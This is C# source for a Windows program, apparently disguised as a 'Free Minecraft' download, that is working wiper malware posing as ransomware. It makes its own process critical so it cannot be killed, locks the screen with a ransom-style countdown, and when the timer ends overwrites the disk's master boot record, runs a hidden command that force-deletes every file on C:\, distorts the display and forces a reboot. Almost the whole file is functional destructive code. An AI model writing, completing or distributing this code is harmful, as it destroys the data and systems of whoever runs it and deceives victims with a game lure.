using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace FreeMinecraft_Final_Wiper
{
    class Program : Form
    {
        // --- NATIVE IMPORTS (MBR & ANTI-KILL) ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        private System.Windows.Forms.Timer countdownTimer;
        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox keyBox;
        private Random rnd = new Random();
        private string secretKey = "DBI_SECRET_2026"; // The only way to stop it!

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            try {
                int isCritical = 1;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            } catch { }
            Application.Run(new Program());
        }

        public Program()
        {
            // --- UI SETUP ---
            this.Text = "Idiot Decryptor - Free Minecraft Edition";
            this.Size = new Size(850, 550);
            this.BackColor = Color.DarkRed;
            this.ForeColor = Color.White;
            this.ControlBox = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.FormClosing += (s, e) => { e.Cancel = true; };

            // Title
            Label lblTitle = new Label() { 
                Text = "Oops, your files have been encrypted!", 
                Font = new Font("Arial", 22, FontStyle.Bold), 
                Location = new Point(250, 20), Size = new Size(580, 50) 
            };

            // Main Text Area
            Label lblMain = new Label() { 
                Text = "What Happened to My Computer?\n\n" +
                       "Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time.\n\n" +
                       "Can I Recover My Files?\n\n" +
                       "Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time. You have 10 minutes to enter the secret key.\n\n" +
                       "If you don't enter the key, the MBR will be overwritten, and C:\\ will be formatted.",
                Font = new Font("Segoe UI", 10), Location = new Point(250, 80), Size = new Size(580, 280),
                BackColor = Color.Maroon, Padding = new Padding(10)
            };

            // Timer Label
            lblTimer = new Label() { 
                Text = "10:00", Font = new Font("Consolas", 48, FontStyle.Bold), 
                ForeColor = Color.Yellow, Location = new Point(30, 100), Size = new Size(200, 80) 
            };

            // Key Input
            keyBox = new TextBox() { 
                Location = new Point(250, 380), Width = 400, 
                Font = new Font("Consolas", 14), BackColor = Color.Black, ForeColor = Color.Lime 
            };

            // Decrypt Button
            Button btnDecrypt = new Button() { 
                Text = "Decrypt", Location = new Point(660, 378), Size = new Size(150, 32), 
                FlatStyle = FlatStyle.Flat, BackColor = Color.Gray 
            };
            btnDecrypt.Click += (s, e) => {
                if (keyBox.Text == secretKey) {
                    countdownTimer.Stop();
                    MessageBox.Show("Key Accepted! PC Restored.", "Success");
                    Application.ExitThread(); 
                    Environment.Exit(0);
                } else {
                    MessageBox.Show("Wrong Key! Time is running out.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            };

            // "Destroy Now" (Emergency/Demo Button)
            Button btnDestroy = new Button() { 
                Text = "Destroy Now", Location = new Point(30, 480), Size = new Size(120, 30), 
                FlatStyle = FlatStyle.Flat, BackColor = Color.Black, Font = new Font("Arial", 7)
            };
            btnDestroy.Click += (s, e) => { timeLeft = 2; };

            this.Controls.AddRange(new Control[] { lblTitle, lblMain, lblTimer, keyBox, btnDecrypt, btnDestroy });

            // --- TIMER START ---
            countdownTimer = new System.Windows.Forms.Timer() { Interval = 1000 };
            countdownTimer.Tick += (s, e) => {
                if (timeLeft > 0) {
                    timeLeft--;
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss");
                } else {
                    countdownTimer.Stop();
                    StartChaos();
                }
            };
            countdownTimer.Start();
        }

        private void StartChaos()
        {
            MessageBox.Show("I give you a chances.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            this.WindowState = FormWindowState.Maximized;

            // 1. KILL MBR
            DestroyMBR();

            // 2. WIPE FILES
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });

            // 3. VISUAL TUNNEL
            System.Windows.Forms.Timer showTimer = new System.Windows.Forms.Timer() { Interval = 30 };
            int f = 0;
            showTimer.Tick += (s, e) => {
                f++;
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width, h = Screen.PrimaryScreen.Bounds.Height;
                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, (f % 2 == 0) ? 0x00990066 : 0x00660044);
                using (Graphics g = Graphics.FromHdc(hdc)) {
                    Pen p = new Pen(Color.FromArgb(rnd.Next(255), 255, 255), 10);
                    int r = (f * 15) % (w / 2);
                    g.DrawEllipse(p, (w/2)-r, (h/2)-r, r*2, r*2);
                }
            };
            showTimer.Start();

            // 4. RESTART AFTER 5 MINS
            new System.Windows.Forms.Timer() { Interval = 300000, Enabled = true }.Tick += (s, e) => { Process.Start("shutdown", "/r /f /t 0"); };
        }

        private void DestroyMBR()
        {
            try {
                byte[] mbr = new byte[512];
                uint w;
                IntPtr d = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(d, mbr, 512, out w, IntPtr.Zero);
            } catch { }
        }
    }
}
